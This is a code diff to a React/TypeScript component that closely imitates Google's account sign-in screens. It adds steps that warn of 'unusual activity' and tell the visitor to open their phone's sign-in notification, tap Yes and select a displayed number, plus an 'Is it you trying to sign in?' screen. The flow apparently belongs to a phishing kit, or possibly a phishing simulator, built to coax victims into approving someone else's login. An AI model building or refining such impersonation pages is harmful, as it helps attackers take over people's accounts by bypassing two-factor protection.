@@ -1614,7 +1614,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
 
 // ─── Google ──────────────────────────────────────────────────────────────────
 
-type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'error-email' | 'error-password' | 'error-code';
+type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'sign-in-attempt' | 'sign-in-blocked' | 'error-email' | 'error-password' | 'error-code';
 
 function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
   const isDark = theme === 'dark';
@@ -1736,7 +1736,9 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                 : step === 'phone-verify' || step === 'phone-code' ? 'Confirm it\'s you'
                 : step === 'phone-confirm' ? 'Confirm your number'
                 : step === 'phone-wrong' ? 'Verify it\'s you'
-                : step === 'prompt-number' ? 'Check your phone'
+                : step === 'prompt-number' ? 'Verify it\'s you'
+                : step === 'sign-in-attempt' ? 'Is it you trying to sign in?'
+                : step === 'sign-in-blocked' ? 'Sign-in blocked'
                 : step === 'verify' ? 'Verify it\'s you'
                 : step === 'processing' ? 'Welcome'
                 : 'Welcome'}
@@ -2057,54 +2059,118 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
               </>
             )}
 
-            {/* ── Google Prompt (number matching) ── */}
+            {/* ── Google Prompt (Check your device — single number) ── */}
             {step === 'prompt-number' && (
               <>
-                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 18 }}>
-                  {/* Phone with notification bubble */}
-                  <div style={{ position: 'relative' }}>
-                    <div style={{ width: 56, height: 56, borderRadius: '50%', background: isDark ? '#3c4043' : '#e8f0fe', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                      <svg viewBox="0 0 24 24" width="30" height="30" fill="none">
-                        <rect x="5" y="2" width="14" height="20" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
-                        <circle cx="12" cy="18" r="1" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
-                        <rect x="8" y="6" width="8" height="1.5" rx="0.75" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
-                        <rect x="8" y="9" width="5" height="1.5" rx="0.75" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
-                      </svg>
-                    </div>
-                    <div style={{ position: 'absolute', top: -4, right: -4, width: 18, height: 18, borderRadius: '50%', background: '#34A853', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                      <svg viewBox="0 0 24 24" width="11" height="11" fill="none">
-                        <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9M13.73 21a2 2 0 0 1-3.46 0" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
-                      </svg>
+                <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
+                  <p style={{ fontSize: 14, color: subText, margin: '0 0 20px', lineHeight: 1.5 }}>
+                    There is something unusual about your activity. For your security, Google wants to make sure it&apos;s really you.
+                  </p>
+                  {/* Phone graphic */}
+                  <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 16 }}>
+                    <div style={{ position: 'relative', width: 80, height: 110 }}>
+                      {/* Phone body */}
+                      <div style={{ width: 80, height: 110, border: `2px solid ${isDark ? '#8e918f' : '#5f6368'}`, borderRadius: 8, background: isDark ? '#3c4043' : '#f8f9fa', position: 'relative', overflow: 'hidden' }}>
+                        {/* Notification bar */}
+                        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 18, background: isDark ? '#5f6368' : '#dadce0', display: 'flex', alignItems: 'center', paddingLeft: 6, gap: 3 }}>
+                          <div style={{ width: 28, height: 6, borderRadius: 2, background: isDark ? '#8e918f' : '#fff', opacity: 0.9 }} />
+                        </div>
+                        {/* Notification card */}
+                        <div style={{ position: 'absolute', top: 22, left: 4, right: 4, background: isDark ? '#202124' : '#fff', borderRadius: 4, padding: '5px 6px', boxShadow: '0 1px 3px rgba(0,0,0,0.2)' }}>
+                          <div style={{ display: 'flex', alignItems: 'center', gap: 4, marginBottom: 3 }}>
+                            <div style={{ width: 10, height: 10, borderRadius: 2, background: '#4285F4', flexShrink: 0 }} />
+                            <div style={{ fontSize: 7, color: isDark ? '#e3e3e3' : '#202124', fontWeight: 600 }}>Google</div>
+                          </div>
+                          <div style={{ fontSize: 6, color: isDark ? '#c4c7c5' : '#5f6368', lineHeight: 1.3 }}>Sign-in attempt</div>
+                          <div style={{ display: 'flex', gap: 4, marginTop: 4 }}>
+                            <div style={{ flex: 1, textAlign: 'center', fontSize: 6, color: isDark ? '#a8c7fa' : '#0b57d0', fontWeight: 600 }}>NO</div>
+                            <div style={{ width: 1, background: isDark ? '#3c4043' : '#dadce0' }} />
+                            <div style={{ flex: 1, textAlign: 'center', fontSize: 6, color: isDark ? '#a8c7fa' : '#0b57d0', fontWeight: 600 }}>YES</div>
+                          </div>
+                        </div>
+                      </div>
                     </div>
                   </div>
-                  <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0, maxWidth: 280, lineHeight: 1.5 }}>
-                    A notification was sent to your Android device.<br/>
-                    Tap the number shown on your Android device.
+                  {/* Instructions */}
+                  <p style={{ fontSize: 13, fontWeight: 600, color: textColor, margin: '0 0 6px' }}>Check your device</p>
+                  <p style={{ fontSize: 13, color: subText, margin: 0, lineHeight: 1.6 }}>
+                    Pull down the notification bar on your phone and tap the sign-in notification. Tap <strong style={{ color: textColor }}>Yes</strong>, then tap{' '}
+                    <strong style={{ color: textColor }}>{gCorrectNumber}</strong> on your device to verify it&apos;s you.
                   </p>
-                  {/* 3 number buttons */}
-                  <div style={{ display: 'flex', gap: 12 }}>
-                    {promptNums.map(num => (
-                      <button key={num}
-                        onClick={() => { if (num === gCorrectNumber) nav('processing'); }}
-                        style={{
-                          width: 72, height: 72, borderRadius: 12,
-                          border: `1px solid ${borderColor}`,
-                          background: 'transparent',
-                          fontSize: 28, fontWeight: 400, color: textColor,
-                          cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
-                          transition: 'background 0.15s, border-color 0.15s',
-                        }}
-                        onMouseEnter={e => { (e.currentTarget as HTMLButtonElement).style.background = isDark ? '#3c4043' : '#e8f0fe'; (e.currentTarget as HTMLButtonElement).style.borderColor = isDark ? '#a8c7fa' : '#0b57d0'; }}
-                        onMouseLeave={e => { (e.currentTarget as HTMLButtonElement).style.background = 'transparent'; (e.currentTarget as HTMLButtonElement).style.borderColor = borderColor; }}>
-                        {num}
-                      </button>
-                    ))}
+                  {/* Large number display */}
+                  <div style={{ fontSize: 52, fontWeight: 300, color: textColor, textAlign: 'center', marginTop: 16, lineHeight: 1 }}>
+                    {gCorrectNumber}
                   </div>
                 </div>
                 <div style={{ display: 'flex', justifyContent: 'flex-start' }}>
                   <button onClick={() => setStep('phone-verify')}
                     style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                     Try another way
+                  </button>
+                </div>
+              </>
+            )}
+
+            {/* ── Sign-in Attempt ("Is it you trying to sign in?") ── */}
+            {step === 'sign-in-attempt' && (
+              <>
+                <div style={{ flex: 1 }}>
+                  {/* Email chip */}
+                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, border: `1px solid ${borderColor}`, borderRadius: 20, padding: '6px 12px 6px 6px', marginBottom: 20, background: isDark ? '#3c3f43' : '#f0f4f9' }}>
+                    <div style={{ width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0 }}>{initial}</div>
+                    <span style={{ fontSize: 14, color: textColor }}>{email || 'janedoe@gmail.com'}</span>
+                  </div>
+                  {/* Info rows */}
+                  {[
+                    { label: 'Device', value: 'Windows 10' },
+                    { label: 'Near', value: 'Mountain View, CA, USA' },
+                    { label: 'Time', value: 'Just now' },
+                  ].map(row => (
+                    <div key={row.label} style={{ marginBottom: 16 }}>
+                      <div style={{ fontSize: 14, fontWeight: 600, color: textColor, marginBottom: 2 }}>{row.label}</div>
+                      <div style={{ fontSize: 14, color: subText }}>{row.value}</div>
+                    </div>
+                  ))}
+                </div>
+                {/* Action buttons */}
+                <div style={{ display: 'flex', gap: 0, borderTop: `1px solid ${borderColor}`, marginTop: 8 }}>
+                  <button
+                    onClick={() => nav('sign-in-blocked')}
+                    style={{ flex: 1, background: 'none', border: 'none', borderRight: `1px solid ${borderColor}`, color: linkColor, fontSize: 14, fontWeight: 600, cursor: 'pointer', padding: '14px 8px', letterSpacing: '0.04em' }}>
+                    NO, IT&apos;S NOT ME
+                  </button>
+                  <button
+                    onClick={() => nav('prompt-number')}
+                    style={{ flex: 1, background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 600, cursor: 'pointer', padding: '14px 8px', letterSpacing: '0.04em' }}>
+                    YES
+                  </button>
+                </div>
+              </>
+            )}
+
+            {/* ── Sign-in Blocked ── */}
+            {step === 'sign-in-blocked' && (
+              <>
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 16, textAlign: 'center' }}>
+                  {/* Shield icon */}
+                  <div style={{ width: 56, height: 56, borderRadius: '50%', background: isDark ? '#1e3a2f' : '#e6f4ea', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                    <svg viewBox="0 0 24 24" width="28" height="28" fill="none">
+                      <path d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11.35C16.5 22.15 20 17.25 20 12V6l-8-4z" fill={isDark ? '#34A853' : '#34A853'} opacity="0.15"/>
+                      <path d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11.35C16.5 22.15 20 17.25 20 12V6l-8-4z" stroke="#34A853" strokeWidth="1.5" strokeLinejoin="round"/>
+                      <path d="M9 12l2 2 4-4" stroke="#34A853" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+                    </svg>
+                  </div>
+                  <div>
+                    <p style={{ fontSize: 14, color: textColor, fontWeight: 500, margin: '0 0 6px' }}>Your sign-in has been blocked</p>
+                    <p style={{ fontSize: 13, color: subText, margin: 0, lineHeight: 1.5, maxWidth: 280 }}>
+                      Your Google Account is protected. The sign-in attempt has been denied.
+                    </p>
+                  </div>
+                </div>
+                <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
+                  <button onClick={() => nav('email')}
+                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#fff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
+                    Done
                   </button>
                 </div>
               </>
